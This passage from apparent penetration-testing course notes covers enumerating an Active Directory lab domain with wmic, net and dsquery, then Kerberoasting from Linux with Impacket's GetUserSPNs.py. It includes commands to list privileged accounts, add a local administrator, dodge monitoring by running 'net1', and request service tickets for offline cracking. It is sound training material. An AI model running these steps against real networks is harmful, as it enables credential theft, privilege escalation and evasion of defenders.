information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.\n\n#### Quick WMI checks\n\n|**Command**|**Description**|\n|---|---|\n|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|\n|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|\n|`wmic process list /format:list`|A listing of all processes on host|\n|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|\n|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|\n|`wmic group list /format:list`|Information about all local groups|\n|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|\n\nBelow we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress\n\nCaption          Description      DnsForestName           DomainControllerAddress  DomainName\nACADEMY-EA-MS01  ACADEMY-EA-MS01\nINLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\\\172.16.5.5             INLANEFREIGHT\nLOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\\\172.16.5.240           LOGISTICS\nFREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\\\172.16.5.238           FREIGHTLOGISTIC\n```\n\nWMI is a vast topic, and it would be impossible to touch on everything it is capable of in one part of a section. For more information about WMI and its capabilities, check out the official [WMI documentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi).\n\n---\n\n## Net Commands\n\n[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:\n\n- Local and domain users\n- Groups\n- Hosts\n- Specific users in groups\n- Domain Controllers\n- Password requirements\n\nWe'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.\n\n#### Table of Useful Net Commands\n\n|**Command**|**Description**|\n|---|---|\n|`net accounts`|Information about password requirements|\n|`net accounts /domain`|Password and lockout policy|\n|`net group /domain`|Information about domain groups|\n|`net group \"Domain Admins\" /domain`|List users with domain admin privileges|\n|`net group \"domain computers\" /domain`|List of PCs connected to the domain|\n|`net group \"Domain Controllers\" /domain`|List PC accounts of domains controllers|\n|`net group <domain_group_name> /domain`|User that belongs to the group|\n|`net groups /domain`|List of domain groups|\n|`net localgroup`|All available groups|\n|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|\n|`net localgroup Administrators`|Information about a group (admins)|\n|`net localgroup administrators [username] /add`|Add user to administrators|\n|`net share`|Check current shares|\n|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|\n|`net user /domain`|List all users of the domain|\n|`net user %username%`|Information about the current user|\n|`net use x: \\computer\\share`|Mount the share locally|\n|`net view`|Get a list of computers|\n|`net view /all /domain[:domainname]`|Shares on the domains|\n|`net view \\computer /ALL`|List shares of a computer|\n|`net view /domain`|List of PCs of the domain|\n\n#### Listing Domain Groups\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> net group /domain\n\nThe request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.\n\nGroup Accounts for \\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n-------------------------------------------------------------------------------\n*$H25000-1RTRKC5S507F\n*Accounting\n*Barracuda_all_access\n*Barracuda_facebook_access\n*Barracuda_parked_sites\n*Barracuda_youtube_exempt\n*Billing\n*Billing_users\n*Calendar Access\n*CEO\n*CFO\n*Cloneable Domain Controllers\n*Collaboration_users\n*Communications_users\n*Compliance Management\n*Computer Group Management\n*Contractors\n*CTO\n\n<SNIP>\n```\n\nWe can see above the `net group` command provided us with a list of groups within the domain.\n\n#### Information about a Domain User\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> net user /domain wrouse\n\nThe request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.\n\nUser name                    wrouse\nFull Name                    Christopher Davis\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            10/27/2021 10:38:01 AM\nPassword expires             Never\nPassword changeable          10/28/2021 10:38:01 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   Never\n\nLogon hours allowed          All\n\nLocal Group Memberships\nGlobal Group memberships     *File Share G Drive   *File Share H Drive\n                             *Warehouse            *Printer Access\n                             *Domain Users         *VPN Users\n                             *Shared Calendar Read\nThe command completed successfully.\n```\n\n#### Net Commands Trick\n\nIf you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.\n\n#### Running Net1 Command\n\n![GIF showcasing the net1 command in a PowerShell terminal.](https://academy.hackthebox.com/storage/modules/143/net1userreal.png)\n\n---\n\n## Dsquery\n\n[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\\(v=ws.11\\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\\Windows\\System32\\dsquery.dll`.\n\n#### Dsquery DLL\n\nAll we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.\n\n#### User Search\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> dsquery user\n\n\"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n```\n\n#### Computer Search\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> dsquery computer\n\n\"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=LON-0456,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=LON-0457,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=LON-0458,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL\"\n```\n\nWe can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\\(v=ws.11\\)) to view all objects in an OU, for example.\n\n#### Wildcard Search\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> dsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\n\"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Domain Computers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Cert Publishers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Domain Guests,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Group Policy Creator Owners,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=RAS and IAS Servers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Allowed RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Denied RODC Password Replication Group,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Enterprise Read-only Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Cloneable Domain Controllers,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Enterprise Key Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=DnsAdmins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=DnsUpdateProxy,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=certsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\"CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\n<SNIP>\n```\n\nWe can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.\n\n#### Users With Specific Attributes Set (PASSWD_NOTREQD)\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> dsquery * -filter \"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n\n  distinguishedName                                                                              userAccountControl\n  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082\n  CN=Marion Lowe,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL      66080\n  CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080\n  CN=Eileen Hamilton,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL    66080\n  CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                           546\n  CN=NAGIOSAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                           544\n  CN=LOGISTICS$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                               2080\n  CN=FREIGHTLOGISTIC$,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                         2080\n```\n\nThe below search filter looks for all Domain Controllers in the current domain, limiting to five results.\n\n#### Searching for Domain Controllers\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\Users\\forend.INLANEFREIGHT> dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n\n sAMAccountName\n ACADEMY-EA-DC01$\n```\n\n### LDAP Filtering Explained\n\nYou will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:\n\n`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).  \n`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.\n\n#### UAC Values\n\n![Diagram of User Account Control Bit Values showing bit positions for various account settings like 'Login Script Will Execute' and 'Account Is Disabled'.](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)\n\n#### OID match strings\n\nOIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:\n\n1. `1.2.840.113556.1.4.803`\n\nWhen using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.\n\n2. `1.2.840.113556.1.4.804`\n\nWhen using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.\n\n3. `1.2.840.113556.1.4.1941`\n\nThis rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.\n\n#### Logical Operators\n\nWhen building out search strings, we can utilize logical operators to combine values for the search. The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:  \n`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`\n\nThe above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:  \n`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`\n\nThis would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.\n\nA lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.\n\n---\n\nWe have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, `Kerberoasting`.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/18-Kerberoasting - from Linux",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/18-Kerberoasting - from Linux.md",
    "title": "18 Kerberoasting   From Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names...",
    "category": "02_CPTS",
    "content": "\n---\n\nOur enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.\n\n---\n\n## Kerberoasting Overview\n\nKerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.\n\nDomain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.\n\nService accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.\n\nFor an interesting look at the origin of this technique, check out the [talk](https://youtu.be/PUyhlN-E5MU) Tim Medin gave at Derbycon 2014, showcasing Kerberoasting to the world.\n\n---\n\n## Kerberoasting - Performing the Attack\n\nDepending on your position in a network, this attack can be performed in multiple ways:\n\n- From a non-domain joined Linux host using valid domain user credentials.\n- From a domain-joined Linux host as root after retrieving the keytab file.\n- From a domain-joined Windows host authenticated as a domain user.\n- From a domain-joined Windows host with a shell in the context of a domain account.\n- As SYSTEM on a domain-joined Windows host.\n- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\\(v=ws.11\\)) /netonly.\n\nSeveral tools can be utilized to perform the attack:\n\n- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.\n- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.\n- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.\n\nObtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be `cracked` offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.\n\n---\n\n## Efficacy of the Attack\n\nWhile it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access. I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.\n\n---\n\n## Performing the Attack\n\nKerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. The following section will walk through a \"semi-manual\" way of performing the attack and two quick, automated attacks using common open-source tools, all from a Windows attack host.\n\n---\n\n## Kerberoasting with GetUserSPNs.py\n\nA prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.\n\nLet's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:\n\n#### Installing Impacket using Pip\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo python3 -m pip install .\n\nProcessing /opt/impacket\n  Preparing metadata (setup.py) ... done\nRequirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)\nRequirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)\nRequirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)\nRequirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)\nRequirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)\n\n<SNIP>\n```\n\nThis will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the `-h` flag will bring up the help menu.\n\n#### Listing GetUserSPNs.py Help Options\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetUserSPNs.py -h\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nusage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]\n                      [-usersfile USERSFILE] [-request]\n                      [-request-user username] [-save]\n                      [-outputfile OUTPUTFILE] [-debug]\n                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]\n                      [-aesKey hex key] [-dc-ip ip address]\n                      target\n\nQueries target domain for SPNs that are running under a user account\n\npositional arguments:\n  target                domain/username[:password]\n\n<SNIP>\n```\n\nWe can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.\n\n#### Listing SPN Accounts with GetUserSPNs.py\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend\n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------\nbackupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               \nsts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               \nMSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               \nMSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               \nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               \nadfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> \n```\n\nWe can now pull all TGS tickets for offline processing using the `-request` flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.\n\n#### Requesting all TGS Tickets\n\nKerberoasting - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request \n\nImpacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------\nbackupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               \nsts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               \nMSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               \nMSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 